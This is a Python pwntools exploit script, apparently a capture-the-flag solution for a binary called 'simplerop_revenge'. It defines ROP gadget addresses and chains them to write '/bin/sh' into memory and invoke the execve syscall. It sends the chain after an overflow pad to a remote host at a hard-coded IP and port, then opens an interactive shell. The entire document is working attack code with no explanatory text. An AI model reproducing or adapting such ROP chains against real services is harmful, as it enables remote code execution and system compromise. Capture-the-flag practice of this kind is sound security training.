from pwn import *

# 0x0000000000401456 : pop rdi ; ret
pop_rdi = 0x401456
# 0x0000000000468579 : pop rax ; ret 0x6c 
pop_rax = 0x468579
# 0x0000000000416830 : mov rax, rdi ; ret
mov_rax_rdi = 0x416830
# 0x000000000047aef4 : mov qword ptr [rax], rdi ; pop rbx ; ret
mov_ptrrax_rdi = 0x47aef4
# 0x0000000000442809 : pop rdx ; pop rsi ; ret
pop_rdx_pop_rsi = 0x442809
# 0x000000000040037a : syscall
syscall = 0x40037a

#r = process('simplerop_revenge')
r = remote('140.110.112.77', 2124)
raw_input('debug:')
r.recvuntil('input :')

payload = p64(pop_rdi) + p64(0x6cc500)
payload += p64(mov_rax_rdi)
payload += p64(pop_rdi) + '/bin/sh\0'
payload += p64(mov_ptrrax_rdi) + 'a' * 8
payload += p64(pop_rdi) + p64(0x6cc500)
payload += p64(pop_rdx_pop_rsi) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

r.sendline('a' * 15 + '\0' + 'a' * 24 + payload)
r.interactive()
